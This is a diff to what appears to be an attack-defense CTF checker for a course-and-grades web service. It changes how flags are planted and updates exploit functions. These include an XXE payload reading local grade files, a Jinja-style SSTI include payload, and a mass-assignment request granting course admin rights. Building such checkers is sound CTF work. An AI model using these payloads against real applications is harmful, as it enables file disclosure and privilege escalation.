@@ -1,3 +1,4 @@
+import asyncio
 from bs4 import BeautifulSoup
 import io
 
@@ -106,8 +107,23 @@ def parse_filecontent(text: str):
         raise MumbleException("No grade filecontent found")
 
 
+def parse_courseid(text: str, title: str):
+    soup = BeautifulSoup(text, "html.parser")
+    li_tags = soup.find_all("li")
+
+    for li in li_tags:
+        if li.h3:
+            cleaned_name = li.h3.text.strip().replace("\n", "")
+            if title in cleaned_name:
+                id_value = re.search(r"\(ID:\s*(\d+)\s*\)", cleaned_name)
+                if id_value:
+                    return id_value.group(1)
+
+    raise MumbleException("No Course Id found")
+
+
 def generate_xxe_payload(filename: str):
-    return (f"""<?xml version="1.0" encoding="UTF-8"?>
+    return f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
     <!ENTITY xxe SYSTEM "file:///service/grades/{filename}">
 ]>
@@ -116,11 +132,22 @@ def generate_xxe_payload(filename: str):
         <name>Malicious Course</name>
         <description>&xxe;</description>
     </course>
-</data>""")
-            
+</data>"""
+
+
+def generate_course(name: str, description: str):
+    return f"""<?xml version="1.0" encoding="UTF-8"?>
+<data>
+    <course>
+        <name>{name}</name>
+        <description>{description}</description>
+    </course>
+</data>"""
+
 
 def generate_ssti_payload(filename: str):
-    return (f"{{% include 'grades/{filename}' %}}")
+    return f"{{% include 'grades/{filename}' %}}"
+
 
 """
 Checker functions
@@ -152,9 +179,27 @@ async def putflag_db(
     r = await client.post("/index.php?action=profile", data=data)
     assert_status_code(logger, r, 200, "Update Profile failed")
 
-    await db.set("info", (username, password, user_id))
+    # create new course and become course admin
+    title = noise(10, 12)
+    files = {
+        "title": (None, title),
+        "course_data": (
+            "newcourse.xml",
+            io.BytesIO(generate_course(noise(3, 5), noise(10, 20)).encode()),
+            "text/xml",
+        ),
+    }
+    r = await client.post("/index.php?action=courses", files=files)
+    assert_status_code(logger, r, 201, "Upload Course failed", info=data)
 
-    return f"User {username} Id {user_id} Profile updated"  # This is attack info
+    # parse course id
+    rcrs = await client.get("/index.php?action=courses")
+    assert_status_code(logger, rcrs, 200, "Get courses failed")
+    course_id = parse_courseid(rcrs.text, title)
+
+    await db.set("info", (username, password, user_id, course_id))
+
+    return f"User {username} Id {user_id} Course {course_id}"  # This is attack info
 
 
 @checker.getflag(0)
@@ -165,7 +210,7 @@ async def getflag_db(
     db: ChainDB,
 ) -> None:
     try:
-        username, password, user_id = await db.get("info")
+        username, password, user_id, course_id = await db.get("info")
     except KeyError:
         raise MumbleException("database entry missing")
 
@@ -238,21 +283,22 @@ async def exploit_mass_assign(
     client: AsyncClient,
     logger: LoggerAdapter,
 ) -> Optional[str]:
+    print(task.attack_info)
     assert_equals(type(task.attack_info), str, "attack info missing")
 
     assert_equals(len(task.attack_info.split()), 6)
 
-    # Attack info is in the form of "User {username} Id {user_id} Profile updated"
-    _, _, _, flaguser_id, _, _ = task.attack_info.split()
+    # Attack info is in the form of "User {username} Id {user_id} Course {course_id}"
+    _, _, _, flaguser_id, _, flagcourse_id = task.attack_info.split()
 
     # register user and login
     username, password = noise(10, 15), noise(16, 20)
-    data = {"username": "exploiter0_" + username, "password": password}
+    data = {"username": "exploiter0_" + username, "password": "password"}
     r = await client.post("/index.php?action=register", data=data)
     assert_status_code(logger, r, 302, "Register failed")
 
     # exploit mass assignment in update profile
-    data = {"username": "exploiter_" + username, "is_admin": 1}
+    data = {"username": "exploiter_" + username, "admin_of": flagcourse_id}
     r = await client.post("/index.php?action=profile", data=data)
     assert_status_code(
         logger, r, 200, "Mass assignment vuln in update Profile failed", info=data
@@ -289,7 +335,11 @@ async def exploit_xxe(
     # exploit xxe in course upload
     files = {
         "title": (None, "Malicious Course"),
-        "course_data": ("exploit4.xml", io.BytesIO(generate_xxe_payload(filename).encode()), "text/xml"),
+        "course_data": (
+            "exploit4.xml",
+            io.BytesIO(generate_xxe_payload(filename).encode()),
+            "text/xml",
+        ),
         "is_private": (None, "on"),
     }
     r = await client.post("/index.php?action=courses", files=files)
@@ -336,7 +386,6 @@ async def exploit_ssti(
     flag = searcher.search_flag(r.text)
     if flag is not None:
         return flag
-
 
 
 if __name__ == "__main__":
